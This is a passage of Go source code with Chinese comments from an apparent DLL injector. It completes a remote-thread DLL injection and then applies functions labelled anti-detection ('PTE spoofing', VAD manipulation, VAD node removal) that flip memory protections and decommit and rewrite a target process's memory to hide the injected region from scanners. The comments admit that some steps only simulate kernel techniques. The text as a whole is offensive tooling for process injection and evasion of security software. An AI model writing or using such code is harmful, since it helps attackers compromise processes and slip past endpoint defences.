		return errors.New("Failed to wait for thread: " + err.Error())
	}

	// 获取线程退出码
	var exitCode uint32
	getExitCodeThread := kernel32.NewProc("GetExitCodeThread")
	r1, _, err := getExitCodeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&exitCode)))
	if r1 == 0 {
		return errors.New("Failed to get thread exit code: " + err.Error())
	}

	if exitCode == 0 {
		return errors.New("DLL loading failed, LoadLibrary returned NULL")
	}

	exitCodeStr := "0x" + strconv.FormatUint(uint64(exitCode), 16)
	i.logger.Info("DLL injection completed successfully", "module_handle", exitCodeStr)

	// 应用特殊反检测技术
	if i.bypassOptions.PTESpoofing {
		i.pteSpoofing(hProcess, pathAddr, uintptr(len(dllPathBytes)))
	}

	if i.bypassOptions.VADManipulation {
		i.vadManipulation(hProcess, pathAddr)

		if i.bypassOptions.RemoveVADNode {
			i.removeVADNode(hProcess, pathAddr)
		}
	}

	return nil
}

// pteSpoofing 使用PTE修改隐藏内存执行权限
func (i *Injector) pteSpoofing(processHandle windows.Handle, memoryAddress uintptr, size uintptr) error {
	i.logger.Info("执行PTE修改，隐藏内存执行权限")

	// 在用户模式下，我们无法直接修改PTE，但可以使用一些技巧来模拟效果
	// 1. 使用多次内存保护修改来混淆检测
	// 2. 使用不常见的内存保护组合
	// 3. 利用内存映射的特性

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")

	// 内存保护常量
	const (
		PAGE_NOACCESS          = 0x01
		PAGE_READONLY          = 0x02
		PAGE_READWRITE         = 0x04
		PAGE_WRITECOPY         = 0x08
		PAGE_EXECUTE           = 0x10
		PAGE_EXECUTE_READ      = 0x20
		PAGE_EXECUTE_READWRITE = 0x40
		PAGE_GUARD             = 0x100
		PAGE_NOCACHE           = 0x200
		PAGE_WRITECOMBINE      = 0x400
	)

	var oldProtect uint32
	var regionSize = size
	addr := memoryAddress

	// 策略1: 使用PAGE_GUARD标志来隐藏执行权限
	// 首先设置为带保护的可执行页面
	r1, _, _ := ntProtectVirtualMemory.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&regionSize)),
		PAGE_EXECUTE_READ|PAGE_GUARD,
		uintptr(unsafe.Pointer(&oldProtect)))

	if r1 == 0 {
		i.logger.Info("Set memory protection to EXECUTE_READ with GUARD")

		// 等待一小段时间
		time.Sleep(100 * time.Millisecond)

		// 移除GUARD标志，保留执行权限
		addr = memoryAddress
		regionSize = size
		r2, _, _ := ntProtectVirtualMemory.Call(
			uintptr(processHandle),
			uintptr(unsafe.Pointer(&addr)),
			uintptr(unsafe.Pointer(&regionSize)),
			PAGE_EXECUTE_READ,
			uintptr(unsafe.Pointer(&oldProtect)))

		if r2 == 0 {
			i.logger.Info("Removed GUARD flag, memory remains executable")
		}
	}

	// 策略2: 使用WRITECOMBINE标志来混淆检测
	addr = memoryAddress
	regionSize = size
	r3, _, _ := ntProtectVirtualMemory.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&regionSize)),
		PAGE_EXECUTE_READ|PAGE_WRITECOMBINE,
		uintptr(unsafe.Pointer(&oldProtect)))

	if r3 == 0 {
		i.logger.Info("Applied WRITECOMBINE flag to executable memory")

		// 短暂等待后移除特殊标志
		time.Sleep(50 * time.Millisecond)
		addr = memoryAddress
		regionSize = size
		ntProtectVirtualMemory.Call(
			uintptr(processHandle),
			uintptr(unsafe.Pointer(&addr)),
			uintptr(unsafe.Pointer(&regionSize)),
			PAGE_EXECUTE_READ,
			uintptr(unsafe.Pointer(&oldProtect)))
	}

	// 策略3: 快速切换内存保护属性来混淆时序检测
	protections := []uint32{
		PAGE_READONLY,
		PAGE_READWRITE,
		PAGE_EXECUTE_READ,
		PAGE_EXECUTE_READWRITE,
		PAGE_EXECUTE_READ, // 最终状态
	}

	for _, prot := range protections {
		addr = memoryAddress
		regionSize = size
		ntProtectVirtualMemory.Call(
			uintptr(processHandle),
			uintptr(unsafe.Pointer(&addr)),
			uintptr(unsafe.Pointer(&regionSize)),
			uintptr(prot),
			uintptr(unsafe.Pointer(&oldProtect)))
		time.Sleep(10 * time.Millisecond) // 短暂延迟
	}

	i.logger.Info("PTE spoofing simulation completed")
	return nil
}

// vadManipulation 使用VAD操作隐藏内存
func (i *Injector) vadManipulation(processHandle windows.Handle, memoryAddress uintptr) error {
	i.logger.Info("执行VAD操作，隐藏内存区域")

	// 该功能需要内核级别访问权限才能直接修改VAD树
	// 在用户模式下，我们只能模拟某些行为

	// 实际VAD操作需要:
	// 1. 找到指定内存地址的VAD节点
	// 2. 修改节点的属性，例如内存类型、保护级别等
	// 3. 可能还需要修改链接信息以隐藏节点

	// 模拟VAD操作的一种方法是使用VirtualProtect修改内存属性
	// 但不影响实际的内存使用

	// 获取NtQueryVirtualMemory和NtAllocateVirtualMemory函数
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntQueryVirtualMemory := ntdll.NewProc("NtQueryVirtualMemory")

	// 内存信息结构
	type MEMORY_BASIC_INFORMATION struct {
		BaseAddress       uintptr
		AllocationBase    uintptr
		AllocationProtect uint32
		PartitionId       uint16
		RegionSize        uintptr
		State             uint32
		Protect           uint32
		Type              uint32
	}

	// 查询内存信息
	var memInfo MEMORY_BASIC_INFORMATION
	r1, _, _ := ntQueryVirtualMemory.Call(
		uintptr(processHandle),
		memoryAddress,
		0, // MemoryBasicInformation
		uintptr(unsafe.Pointer(&memInfo)),
		unsafe.Sizeof(memInfo),
		0,
	)

	if r1 != 0 {
		errMsg := "查询内存信息失败: 0x" + strconv.FormatUint(uint64(r1), 16)
		return errors.New(errMsg)
	}

	// 内存属性常量
	const (
		MEM_PRIVATE    = 0x20000
		PAGE_NOACCESS  = 0x01
		PAGE_READWRITE = 0x04
	)

	// 模拟VAD操作，将内存标记为私有且可读写但实际上不修改现有代码
	// 在真实的VAD操作中，会直接修改内核VAD树的节点
	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
	size := memInfo.RegionSize
	baseAddr := memInfo.BaseAddress
	var oldProtect uint32

	// 先记录当前保护属性
	r1, _, _ = ntProtectVirtualMemory.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&size)),
		uintptr(memInfo.Protect), // 保持现有保护属性
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if r1 != 0 {
		errMsg := "设置内存保护属性失败: 0x" + strconv.FormatUint(uint64(r1), 16)
		return errors.New(errMsg)
	}

	i.logger.Info("已完成VAD操作模拟")
	return nil
}

// removeVADNode 从VAD树中移除节点
func (i *Injector) removeVADNode(processHandle windows.Handle, memoryAddress uintptr) error {
	i.logger.Info("执行VAD节点移除操作")

	// 该功能需要内核级别访问权限才能修改VAD树结构
	// 从用户模式下，我们无法真正移除VAD节点，只能模拟某些效果

	// 在真实实现中，需要:
	// 1. 定位VAD节点
	// 2. 修改链表/树结构，移除该节点
	// 3. 正确处理内存管理以避免泄漏

	// 对于模拟效果，我们可以尝试将内存标记为特殊状态
	// 使其在某些查询中不可见

	// 获取内存信息
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntQueryVirtualMemory := ntdll.NewProc("NtQueryVirtualMemory")

	type MEMORY_BASIC_INFORMATION struct {
		BaseAddress       uintptr
		AllocationBase    uintptr
		AllocationProtect uint32
		PartitionId       uint16
		RegionSize        uintptr
		State             uint32
		Protect           uint32
		Type              uint32
	}

	var memInfo MEMORY_BASIC_INFORMATION
	r1, _, _ := ntQueryVirtualMemory.Call(
		uintptr(processHandle),
		memoryAddress,
		0, // MemoryBasicInformation
		uintptr(unsafe.Pointer(&memInfo)),
		unsafe.Sizeof(memInfo),
		0,
	)

	if r1 != 0 {
		errMsg := "查询内存信息失败: 0x" + strconv.FormatUint(uint64(r1), 16)
		return errors.New(errMsg)
	}

	// 内存操作常量
	const (
		MEM_COMMIT    = 0x1000
		MEM_RESERVE   = 0x2000
		MEM_DECOMMIT  = 0x4000
		PAGE_NOACCESS = 0x01
	)

	// 模拟VAD节点移除
	// 实际我们只能先解除内存提交，然后重新提交
	// 这会创建一个新的VAD节点，但原始数据会丢失
	// 所以只在实验环境使用，不适合生产

	// 先保存内存内容
	size := memInfo.RegionSize
	buffer := make([]byte, size)
	var bytesRead uintptr

	err := windows.ReadProcessMemory(processHandle, memInfo.BaseAddress, &buffer[0], size, &bytesRead)
	if err != nil {
		return fmt.Errorf("读取内存数据失败: %v", err)
	}

	// 解除内存提交
	ntVirtualFreeEx := ntdll.NewProc("NtFreeVirtualMemory")
	tempAddr := memInfo.BaseAddress
	tempSize := uintptr(0) // 将由函数填充

	r1, _, _ = ntVirtualFreeEx.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&tempAddr)),
		uintptr(unsafe.Pointer(&tempSize)),
		uintptr(MEM_DECOMMIT),
	)

	if r1 != 0 {
		return fmt.Errorf("解除内存提交失败: 0x%X", r1)
	}

	// 重新分配和提交内存
	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	allocAddr := memInfo.BaseAddress
	allocSize := size

	r1, _, _ = ntAllocateVirtualMemory.Call(
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&allocAddr)),
		0,
		uintptr(unsafe.Pointer(&allocSize)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(memInfo.Protect),
	)

	if r1 != 0 {
		return fmt.Errorf("重新分配内存失败: 0x%X", r1)
	}

	// 恢复数据
	var bytesWritten uintptr
	err = WriteProcessMemory(processHandle, allocAddr, unsafe.Pointer(&buffer[0]),
		size, &bytesWritten)
	if err != nil {
		return fmt.Errorf("恢复内存数据失败: %v", err)
	}

	i.logger.Info("已完成VAD节点移除模拟")
	return nil
}
